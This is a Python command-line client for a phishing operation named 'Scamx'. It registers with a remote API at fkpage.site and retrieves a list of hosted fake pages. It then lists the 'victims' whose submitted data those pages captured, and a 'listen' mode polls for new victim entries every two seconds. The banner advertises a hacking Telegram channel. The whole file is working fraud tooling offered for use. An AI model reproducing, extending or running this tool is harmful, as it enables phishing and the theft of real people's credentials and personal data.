#! /usr/bin/env python3
import os
import sys
import time
import json
import random 
try:
    import requests
except:
    os.system('pip install requests')
try:
    import colorama
except:
    os.system('pip install colorama')

from colorama import Fore, Back, Style, init
import requests

# Initialize colorama
init(autoreset=True)


c = Fore


# Reset
RESET = "\033[0m"

# Regular Colors
BLACK = "\033[0;30m"
RED = "\033[0;31m"
GREEN = "\033[0;32m"
YELLOW = "\033[0;33m"
BLUE = "\033[0;34m"
PURPLE = "\033[0;35m"
CYAN = "\033[0;36m"
WHITE = "\033[0;37m"

# Bold
BOLD_BLACK = "\033[1;30m"
BOLD_RED = "\033[1;31m"
BOLD_GREEN = "\033[1;32m"
BOLD_YELLOW = "\033[1;33m"
BOLD_BLUE = "\033[1;34m"
BOLD_PURPLE = "\033[1;35m"
BOLD_CYAN = "\033[1;36m"
BOLD_WHITE = "\033[1;37m"


UNDERLINE_BLACK = "\033[4;30m"
UNDERLINE_RED = "\033[4;31m"
UNDERLINE_GREEN = "\033[4;32m"
UNDERLINE_YELLOW = "\033[4;33m"
UNDERLINE_BLUE = "\033[4;34m"
UNDERLINE_PURPLE = "\033[4;35m"
UNDERLINE_CYAN = "\033[4;36m"
UNDERLINE_WHITE = "\033[4;37m"

BG_BLACK = "\033[40m"
BG_RED = "\033[41m"
BG_GREEN = "\033[42m"
BG_YELLOW = "\033[43m"
BG_BLUE = "\033[44m"
BG_PURPLE = "\033[45m"
BG_CYAN = "\033[46m"
BG_WHITE = "\033[47m"
HI_BLACK = "\033[0;90m"
HI_RED = "\033[0;91m"
HI_GREEN = "\033[0;92m"
HI_YELLOW = "\033[0;93m"
HI_BLUE = "\033[0;94m"
HI_PURPLE = "\033[0;95m"
HI_CYAN = "\033[0;96m"
HI_WHITE = "\033[0;97m"
BOLD_HI_BLACK = "\033[1;90m"
BOLD_HI_RED = "\033[1;91m"
BOLD_HI_GREEN = "\033[1;92m"
BOLD_HI_YELLOW = "\033[1;93m"
BOLD_HI_BLUE = "\033[1;94m"
BOLD_HI_PURPLE = "\033[1;95m"
BOLD_HI_CYAN = "\033[1;96m"
BOLD_HI_WHITE = "\033[1;97m"
BG_HI_BLACK = "\033[0;100m"
BG_HI_RED = "\033[0;101m"
BG_HI_GREEN = "\033[0;102m"
BG_HI_YELLOW = "\033[0;103m"
BG_HI_BLUE = "\033[0;104m"
BG_HI_PURPLE = "\033[0;105m"
BG_HI_CYAN = "\033[0;106m"
BG_HI_WHITE = "\033[0;107m"
tool_name = "Scamx"
api_url = "https://fkpage.site/fk-page-api-tool/api_bin.php"
class Generate_banner:
    def __init__(self):
        pass
    def __banner_list(self):
        list = [
f"""{RED}
  ██████  ▄████▄   ▄▄▄       ███▄ ▄███▓▒██   ██▒
▒██    ▒ ▒██▀ ▀█  ▒████▄    ▓██▒▀█▀ ██▒▒▒ █ █ ▒░
░ ▓██▄   ▒▓█    ▄ ▒██  ▀█▄  ▓██    ▓██░░░  █   ░
  ▒   ██▒▒▓▓▄ ▄██▒░██▄▄▄▄██ ▒██    ▒██  ░ █ █ ▒ 
▒██████▒▒▒ ▓███▀ ░ ▓█   ▓██▒▒██▒   ░██▒▒██▒ ▒██▒
▒ ▒▓▒ ▒ ░░ ░▒ ▒  ░ ▒▒   ▓▒█░░ ▒░   ░  ░▒▒ ░ ░▓ ░
░ ░▒  ░ ░  ░  ▒     ▒   ▒▒ ░░  ░      ░░░   ░▒ ░
░  ░  ░  ░          ░   ▒   ░      ░    ░    ░  
      ░  ░ ░            ░  ░       ░    ░    ░   
         ░                                      
{GREEN}[+]{WHITE} WebSite Link:{PURPLE} https://fkpage.site
{GREEN}[+]{WHITE} Telegram channel:{PURPLE} https://t.me/how_tohack
{GREEN}[+]{WHITE} My Telegram Account:{PURPLE} https://t.me/issamiso 
{CYAN}---------------------------------------------"""
        ]
        
        return random.choice(list)
    def print_banner(self,print_s=True):
        if print_s:
            print(self.__banner_list())
        else:
            return self.__banner_list
            
bnr = Generate_banner()



def print_status(text,timeout=0):

    print(text)
    
    time.sleep(timeout)
        


tool_session = None

def Post(url="https://fkpage.site/fk-page-api-tool/api_bin.php",json={}):
    response = requests.post(url=url,json=json).json()
    return response
    


def clear_screen():
    """Clears the terminal screen on Windows and Linux."""
    # For Windows, use 'cls'; for Linux and Unix, use 'clear'
    os.system('cls' if os.name == 'nt' else 'clear')  

class tool_session:
    def __init__(self):
        pass


    def generate_session(self):
        global tool_session
        js = {
            "action":"create_account"
        }
        res = Post(url=api_url,json=js)
        
       
        
        status = res['status']
        
        if status == "true":
            
            
            tool_session = res['tool_session']
            with open('./configs/tool_session.txt','w') as f:
                f.write(tool_session)
            print_status(c.GREEN+f"[+] {c.CYAN}Session Created successfully")
            return True

    
    def check(self):
        global tool_session
        
        if not os.path.exists("./configs/tool_session.txt"):
            print_status(c.YELLOW+f"[!] {c.RESET}Create Tool Session ...")
            self.generate_session()
        else:
            f= open('./configs/tool_session.txt','r').read()
            tool_session  = f.strip()

        js = {
            "action": "generate_scams", 
            "tool_session": tool_session
        }


        scamers_list = Post(url=api_url,json=js)
        sts = scamers_list['status']
        if sts == "true":
            list = scamers_list['list']
            return list 

            


class scamer:
    def __init__(self):
        self.scam_link = "" 
        




    def show_all_scams(self):
        print()
        kk=0
        for i in self.scam_link:
            kk+=1
            sts = str(kk)
            if kk < 10:
                sts = "0" + str(kk)
            rem_url = i.replace('https://lightcoral-lobster-205213.hostingersite.com/','')
            new_name = rem_url.split('/')[0].strip()
            if "web/" not in i:
                print_status(
                    f"{BOLD_GREEN}{BG_RED}{new_name}{RESET}   {BOLD_CYAN}link:{BOLD_PURPLE} {i}"
                )
        try:
            print()
            ss = input(f'{BOLD_BLUE}[*]{BOLD_GREEN} click to back ...')
        except KeyboardInterrupt:
            sys.exit()

        clear_screen()
        bnr = Generate_banner().print_banner()
        
        self.show_opt()

    def show_all_victims(self):
        print()
        js = {
            "action":"get_victims",
            "tool_session":tool_session
        }


        try:
            res = Post(url=api_url,json=js)
            status = res['status']
            if status == "true":
                list = res['list']
                for i in list:
                    for key,value in i.items():
                        if key == "user_id" or key == "id" or key == "photo":
                            pass
                        else:
                            if key == "page":
                                value = BG_RED + value + RESET
                            print_status(
                                f"{BOLD_RED}[*]{BOLD_PURPLE} {key}: {BOLD_HI_WHITE}{value}"
                            )
                    print('-'*30)
        except Exception as e:
            print_status(BG_RED+ str(e)+RESET)
        try:
            print()
            ss = input(f'{BOLD_BLUE}[*]{BOLD_GREEN} click to back ...')
        except KeyboardInterrupt:
            sys.exit()

        clear_screen()
        bnr = Generate_banner().print_banner()
        
        self.show_opt()
    


    def start_listen(self):
        print()

        glob_list = []
        js = {
            "action":"get_victims",
            "tool_session":tool_session
        }


        
        res = Post(url=api_url,json=js)
        status = res['status']
        if status == "true":
            list = res['list']
            for i in list:
                glob_list.append(i)
        

        
        print_status(f"{BOLD_PURPLE}[+] {UNDERLINE_RED}{BOLD_GREEN}Start Listening ....{RESET}")

        
        while True:
            try:
                res = Post(url=api_url,json=js)
                status = res['status']
                if status == "true":
                    list = res['list']
                    for i in list:
                        if i not in glob_list:
                            glob_list.append(i)
                            for key,value in i.items():
                                if key == "user_id" or key == "id" or key == "photo":
                                    pass
                                else:
                                    if key == "page":
                                        value = BG_RED + value + RESET
                                    print_status(
                                        f"{BOLD_RED}[*]{BOLD_PURPLE} {key}: {BOLD_HI_WHITE}{value}"
                                    )
                            print('-'*30)
                        
                            
                time.sleep(2)
                                
            except KeyboardInterrupt:
                clear_screen()
                bnr = Generate_banner().print_banner()
                self.show_opt()
                
            except Exception as e:
                print(BG_RED + str(e) + RESET)

        
    
    
    def show_opt(self):
        print_status(f"""
{BOLD_HI_BLUE}[{BOLD_RED}1{BOLD_HI_BLUE}]{BOLD_WHITE} Show Scames
{BOLD_HI_BLUE}[{BOLD_RED}2{BOLD_HI_BLUE}]{BOLD_WHITE} Sow All Victims
{BOLD_HI_BLUE}[{BOLD_RED}3{BOLD_HI_BLUE}]{BOLD_WHITE} Start listen
{BOLD_HI_BLUE}[{BOLD_RED}4{BOLD_HI_BLUE}]{BOLD_WHITE} Exit""",timeout=0.02)
        while True:
            try:

                fl = input(UNDERLINE_GREEN+BOLD_HI_PURPLE+tool_name+f"{BOLD_RED} ({BOLD_GREEN}Choice Option{BOLD_RED}){BOLD_HI_PURPLE} />{BOLD_WHITE} ").strip()
            except KeyboardInterrupt:
                sys.exit()
                quit()
            if fl == "1":
                self.show_all_scams() 
            elif fl == "2":
                self.show_all_victims()
            elif fl == "3":
                self.start_listen()
            elif fl == "4":
                sys.exit()
                quit()



        



    def run(self,list_scam):
        self.scam_link = list_scam
        f= open('./configs/tool_session.txt','r').read()
        tool_session  = f.strip()
        self.show_opt()


    



def main():


    bnr = Generate_banner()
    bnr.print_banner()
    scam = scamer() 

    tool = tool_session()
    list_scam = tool.check()
    scam.run(list_scam=list_scam)
    




if __name__ == "__main__":
    main()

